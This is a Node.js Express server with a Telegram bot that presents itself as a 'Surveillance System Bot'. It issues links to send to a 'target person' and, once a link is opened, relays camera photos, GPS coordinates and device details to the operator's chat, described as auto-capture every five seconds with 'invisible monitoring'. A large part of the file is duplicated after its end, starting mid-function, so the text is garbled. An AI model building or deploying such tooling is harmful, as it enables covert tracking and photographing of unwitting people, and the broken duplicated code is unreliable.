require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Initialisation
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
const userSessions = new Map();

// Webhook Configuration Middleware
app.use((req, res, next) => {
  if (!global.webhookSet && req.get('host')) {
    const protocol = req.protocol || 'https';
    const webhookUrl = `${protocol}://${req.get('host')}/bot${process.env.TELEGRAM_BOT_TOKEN}`;
    bot.setWebHook(webhookUrl)
      .then(() => {
        console.log('✅ Webhook set:', webhookUrl);
        global.webhookSet = true;
      })
      .catch(err => console.error('❌ Webhook error:', err.message));
  }
  next();
});

// Multer Storage Configuration
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadsDir = 'uploads';
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir);
    }
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    cb(null, `photo-${Date.now()}.jpg`);
  }
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }
});

// Express Middlewares
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// Telegram Webhook Endpoint
app.post(`/bot${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// Serve frontend application
app.get('/', (req, res) => {
  const indexPath = path.join(__dirname, 'public', 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.status(404).send('index.html not found');
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok',
    bot: !!process.env.TELEGRAM_BOT_TOKEN,
    webhook: global.webhookSet || false,
    sessions: userSessions.size,
    timestamp: new Date().toISOString()
  });
});

// Photo and Location Upload API
app.post('/upload-photo', upload.single('photo'), async (req, res) => {
  console.log('📸 Upload request received');
  
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, error: 'No photo provided' });
    }

    const { sessionId, cameraType, location, browserInfo } = req.body;
    const session = userSessions.get(sessionId);
    
    if (!session) {
      if (fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
      return res.status(404).json({ success: false, error: 'Invalid or expired session' });
    }

    const chatId = session.chatId;
    const photoPath = req.file.path;
    
    // Data parsing safely
    const locationData = location ? JSON.parse(location) : null;
    const browserData = browserInfo ? JSON.parse(browserInfo) : {};

    // Construct Caption
    let caption = `📸 *New Photo Captured*\n\n`;
    caption += `📷 Camera: ${cameraType === 'front' ? 'Front 🤳' : 'Back 📱'}\n`;
    caption += `🆔 Session: \`${sessionId}\`\n`;
    caption += `📊 Capture #${session.captures + 1}\n\n`;

    if (locationData && locationData.latitude) {
      caption += `📍 *Location:*\n`;
      caption += `Lat: \`${locationData.latitude.toFixed(6)}\`\n`;
      caption += `Lng: \`${locationData.longitude.toFixed(6)}\`\n`;
      caption += `Accuracy: ${locationData.accuracy.toFixed(0)}m\n\n`;
    }

    caption += `💻 *Device Info:*\n`;
    caption += `Platform: ${browserData.platform || 'Unknown'}\n`;
    caption += `Screen: ${browserData.screenWidth}x${browserData.screenHeight}\n`;
    caption += `Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n`;

    console.log(`📤 Sending data to Telegram chat: ${chatId}`);
    
    // Send Photo
    await bot.sendPhoto(chatId, fs.createReadStream(photoPath), {
      caption: caption,
      parse_mode: 'Markdown'
    });
    console.log('✅ Photo sent successfully');

    // Send Location if available
    if (locationData && locationData.latitude) {
      await bot.sendLocation(chatId, locationData.latitude, locationData.longitude);
      console.log('✅ Location sent');
    }

    // Update session metrics
    session.captures++;
    session.lastCapture = new Date();

    // Cleanup local uploaded file
    fs.unlinkSync(photoPath);
    console.log('🗑️ Temp file deleted');

    res.json({ 
      success: true, 
      message: 'Photo sent to Telegram',
      captureNumber: session.captures
    });

  } catch (error) {
    console.error('❌ Upload execution error:', error);
    if (req.file && fs.existsSync(req.file.path)) {
      fs.unlinkSync(req.file.path);
    }
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- Telegram Bot Commands Registration ---

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const welcomeMessage = `
🔐 *Surveillance System Bot*

Welcome! Generate surveillance links to capture photos remotely.

*Commands:*
/generatelink - Generate new link
/sessions - View active sessions
/help - Show help guide

Click below to get started! 👇
`;

  await bot.sendMessage(chatId, welcomeMessage, { 
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔗 Generate Link', callback_data: 'generate' }],
        [{ text: '📊 View Sessions', callback_data: 'sessions' }],
        [{ text: '❓ Help Guide', callback_data: 'help' }]
      ]
    }
  });
});

bot.onText(/\/generatelink/, async (msg) => {
  await generateLink(msg.chat.id);
});

bot.onText(/\/sessions/, async (msg) => {
  await showSessions(msg.chat.id);
});

bot.onText(/\/help/, async (msg) => {
  await showHelp(msg.chat.id);
});

// Inline Keyboard Interaction Callback
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  try {
    if (data === 'generate') {
      await generateLink(chatId);
    } else if (data === 'sessions') {
      await showSessions(chatId);
    } else if (data === 'help') {
      await showHelp(chatId);
    }
    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error('Callback parsing error:', error);
  }
});

// Helper Functions for Command Execution
async function generateLink(chatId) {
  try {
    const sessionId = Math.random().toString(36).substring(7);
    const baseUrl = process.env.BASE_URL || 'https://your-app.onrender.com';
    const link = `${baseUrl}/?session=${sessionId}`;
    
    userSessions.set(sessionId, {
      chatId: chatId,
      createdAt: new Date(),
      captures: 0
    });

    console.log(`🔗 Link generated for chat ${chatId}: ${sessionId}`);

    const message = `
✅ *Link Generated Successfully!*

🔗 *Surveillance Link:*
\`${link}\`

📋 Session ID: \`${sessionId}\`
⏰ Created: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}

*Instructions:*
1. Copy and send this link
2. Target opens the link
3. Photos sent to you automatically

*Features Active:*
📸 Front & Back camera
📍 GPS location
💻 Device info
🔄 Auto-capture every 5s
`;

    await bot.sendMessage(chatId, message, { 
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔗 Open Link', url: link }],
          [
            { text: '🔄 New Link', callback_data: 'generate' },
            { text: '📊 Sessions', callback_data: 'sessions' }
          ]
        ]
      }
    });
  } catch (error) {
    console.error('Generate link error:', error);
    await bot.sendMessage(chatId, '❌ Error generating link. Please try again.');
  }
}

async function showSessions(chatId) {
  try {
    const userSessionsList = Array.from(userSessions.entries())
      .filter(([_, session]) => session.chatId === chatId);

    if (userSessionsList.length === 0) {
      await bot.sendMessage(chatId, '📭 No active sessions.\n\nUse /generatelink to create one!', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '🔗 Generate Link', callback_data: 'generate' }]
          ]
        }
      });
      return;
    }

    let message = `📊 *Your Active Sessions*\n\n`;
    message += `Total: ${userSessionsList.length}\n\n`;
    
    userSessionsList.forEach(([sessionId, session], index) => {
      message += `*${index + 1}. \`${sessionId}\`*\n`;
      message += `   📸 Captures: ${session.captures}\n`;
      message += `   ⏰ Created: ${session.createdAt.toLocaleTimeString()}\n`;
      if (session.lastCapture) {
        message += `   🕐 Last Capture: ${session.lastCapture.toLocaleTimeString()}\n`;
      }
      message += `\n`;
    });

    await bot.sendMessage(chatId, message, { 
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔗 New Link', callback_data: 'generate' }]
        ]
      }
    });
  } catch (error) {
    console.error('Show sessions error:', error);
    await bot.sendMessage(chatId, '❌ Error loading sessions. Please try again.');
  }
}

async function showHelp(chatId) {
  const helpMessage = `
📖 *Help Guide*

*How to use:*
1️⃣ Use /generatelink to create a surveillance link
2️⃣ Send the link to target person
3️⃣ When they open it:
   • Loading screen appears
   • Camera access requested
   • Photos captured automatically
   • Sent to you in real-time

*Features:*
✅ Front & back camera
✅ GPS location tracking
✅ Device information
✅ Auto-capture every 5 seconds
✅ Invisible monitoring

⚠️ Use responsibly and legally only.
`;

  await bot.sendMessage(chatId, helpMessage, { 
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔗 Generate Link', callback_data: 'generate' }]
      ]
    }
  });
}

// Fallback Route Handling
app.use((req, res) => {
  res.status(404).json({ 
    error: 'Not found',
    path: req.path
  });
});

// Global Error Handler Middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// Initialise Application Server
app.listen(PORT, '0.0.0.0', () => {
  console.log('================================');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Bot token: ${process.env.TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Missing ❌'}`);
  console.log(`📂 public folder: ${fs.existsSync('public') ? 'Found ✅' : 'Missing ❌'}`);
  console.log(`📄 index.html: ${fs.existsSync('public/index.html') ? 'Found ✅' : 'Missing ❌'}`);
  console.log('================================');
});

// Session Cleanup Scheduler (Removes > 24 hours old sessions every hour)
setInterval(() => {
  const now = new Date();
  let cleaned = 0;
  
  for (const [sessionId, session] of userSessions.entries()) {
    const age = now - session.createdAt;
    if (age > 24 * 60 * 60 * 1000) {
      userSessions.delete(sessionId);
      cleaned++;
    }
  }
  
  if (cleaned > 0) {
    console.log(`🗑️ Cleaned ${cleaned} old sessions`);
  }
}, 60 * 60 * 1000);

// Global Error/Rejection Loggers
bot.on('polling_error', (error) => {
  console.error('Polling error:', error.code);
});

process.on('unhandledRejection', (error) => {
  console.error('Unhandled rejection:', error);
});
    caption += `📊 Capture #${session.captures + 1}\n\n`;

    if (locationData && locationData.latitude) {
      caption += `📍 *Location:*\n`;
      caption += `Lat: \`${locationData.latitude.toFixed(6)}\`\n`;
      caption += `Lng: \`${locationData.longitude.toFixed(6)}\`\n`;
      caption += `Accuracy: ${locationData.accuracy.toFixed(0)}m\n\n`;
    }

    caption += `💻 *Device Info:*\n`;
    caption += `Platform: ${browserData.platform || 'Unknown'}\n`;
    caption += `Screen: ${browserData.screenWidth}x${browserData.screenHeight}\n`;
    caption += `Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n`;

    console.log(`📤 Sending data to Telegram chat: ${chatId}`);
    
    // Send Photo
    await bot.sendPhoto(chatId, fs.createReadStream(photoPath), {
      caption: caption,
      parse_mode: 'Markdown'
    });
    console.log('✅ Photo sent successfully');

    // Send Location if available
    if (locationData && locationData.latitude) {
      await bot.sendLocation(chatId, locationData.latitude, locationData.longitude);
      console.log('✅ Location sent');
    }

    // Update session metrics
    session.captures++;
    session.lastCapture = new Date();

    // Cleanup local uploaded file
    fs.unlinkSync(photoPath);
    console.log('🗑️ Temp file deleted');

    res.json({ 
      success: true, 
      message: 'Photo sent to Telegram',
      captureNumber: session.captures
    });

  } catch (error) {
    console.error('❌ Upload execution error:', error);
    if (req.file && fs.existsSync(req.file.path)) {
      fs.unlinkSync(req.file.path);
    }
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- Telegram Bot Commands Registration ---

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const welcomeMessage = `
🔐 *Surveillance System Bot*

Welcome! Generate surveillance links to capture photos remotely.

*Commands:*
/generatelink - Generate new link
/sessions - View active sessions
/help - Show help guide

Click below to get started! 👇
`;

  await bot.sendMessage(chatId, welcomeMessage, { 
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔗 Generate Link', callback_data: 'generate' }],
        [{ text: '📊 View Sessions', callback_data: 'sessions' }],
        [{ text: '❓ Help Guide', callback_data: 'help' }]
      ]
    }
  });
});

bot.onText(/\/generatelink/, async (msg) => {
  await generateLink(msg.chat.id);
});

bot.onText(/\/sessions/, async (msg) => {
  await showSessions(msg.chat.id);
});

bot.onText(/\/help/, async (msg) => {
  await showHelp(msg.chat.id);
});

// Inline Keyboard Interaction Callback
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  try {
    if (data === 'generate') {
      await generateLink(chatId);
    } else if (data === 'sessions') {
      await showSessions(chatId);
    } else if (data === 'help') {
      await showHelp(chatId);
    }
    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error('Callback parsing error:', error);
  }
});

// Helper Functions for Command Execution
async function generateLink(chatId) {
  try {
    const sessionId = Math.random().toString(36).substring(7);
    const baseUrl = process.env.BASE_URL || 'https://your-app.onrender.com';
    const link = `${baseUrl}/?session=${sessionId}`;
    
    userSessions.set(sessionId, {
      chatId: chatId,
      createdAt: new Date(),
      captures: 0
    });

    console.log(`🔗 Link generated for chat ${chatId}: ${sessionId}`);

    const message = `
✅ *Link Generated Successfully!*

🔗 *Surveillance Link:*
\`${link}\`

📋 Session ID: \`${sessionId}\`
⏰ Created: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}

*Instructions:*
1. Copy and send this link
2. Target opens the link
3. Photos sent to you automatically

*Features Active:*
📸 Front & Back camera
📍 GPS location
💻 Device info
🔄 Auto-capture every 5s
`;

    await bot.sendMessage(chatId, message, { 
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔗 Open Link', url: link }],
          [
            { text: '🔄 New Link', callback_data: 'generate' },
            { text: '📊 Sessions', callback_data: 'sessions' }
          ]
        ]
      }
    });
  } catch (error) {
    console.error('Generate link error:', error);
    await bot.sendMessage(chatId, '❌ Error generating link. Please try again.');
  }
}

async function showSessions(chatId) {
  try {
    const userSessionsList = Array.from(userSessions.entries())
      .filter(([_, session]) => session.chatId === chatId);

    if (userSessionsList.length === 0) {
      await bot.sendMessage(chatId, '📭 No active sessions.\n\nUse /generatelink to create one!', {
        reply_markup: {
          inline_keyboard: [
            [{ text: '🔗 Generate Link', callback_data: 'generate' }]
          ]
        }
      });
      return;
    }

    let message = `📊 *Your Active Sessions*\n\n`;
    message += `Total: ${userSessionsList.length}\n\n`;
    
    userSessionsList.forEach(([sessionId, session], index) => {
      message += `*${index + 1}. \`${sessionId}\`*\n`;
      message += `   📸 Captures: ${session.captures}\n`;
      message += `   ⏰ Created: ${session.createdAt.toLocaleTimeString()}\n`;
      if (session.lastCapture) {
        message += `   🕐 Last Capture: ${session.lastCapture.toLocaleTimeString()}\n`;
      }
      message += `\n`;
    });

    await bot.sendMessage(chatId, message, { 
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔗 New Link', callback_data: 'generate' }]
        ]
      }
    });
  } catch (error) {
    console.error('Show sessions error:', error);
    await bot.sendMessage(chatId, '❌ Error loading sessions. Please try again.');
  }
}

async function showHelp(chatId) {
  const helpMessage = `
📖 *Help Guide*

*How to use:*
1️⃣ Use /generatelink to create a surveillance link
2️⃣ Send the link to target person
3️⃣ When they open it:
   • Loading screen appears
   • Camera access requested
   • Photos captured automatically
   • Sent to you in real-time

*Features:*
✅ Front & back camera
✅ GPS location tracking
✅ Device information
✅ Auto-capture every 5 seconds
✅ Invisible monitoring

⚠️ Use responsibly and legally only.
`;

  await bot.sendMessage(chatId, helpMessage, { 
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔗 Generate Link', callback_data: 'generate' }]
      ]
    }
  });
}

// Fallback Route Handling
app.use((req, res) => {
  res.status(404).json({ 
    error: 'Not found',
    path: req.path
  });
});

// Global Error Handler Middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// Initialise Application Server
app.listen(PORT, '0.0.0.0', () => {
  console.log('================================');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Bot token: ${process.env.TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Missing ❌'}`);
  console.log(`📂 public folder: ${fs.existsSync('public') ? 'Found ✅' : 'Missing ❌'}`);
  console.log(`📄 index.html: ${fs.existsSync('public/index.html') ? 'Found ✅' : 'Missing ❌'}`);
  console.log('================================');
});

// Session Cleanup Scheduler (Removes > 24 hours old sessions every hour)
setInterval(() => {
  const now = new Date();
  let cleaned = 0;
  
  for (const [sessionId, session] of userSessions.entries()) {
    const age = now - session.createdAt;
    if (age > 24 * 60 * 60 * 1000) {
      userSessions.delete(sessionId);
      cleaned++;
    }
  }
  
  if (cleaned > 0) {
    console.log(`🗑️ Cleaned ${cleaned} old sessions`);
  }
}, 60 * 60 * 1000);

// Global Error/Rejection Loggers
bot.on('polling_error', (error) => {
  console.error('Polling error:', error.code);
});

process.on('unhandledRejection', (error) => {
  console.error('Unhandled rejection:', error);
});
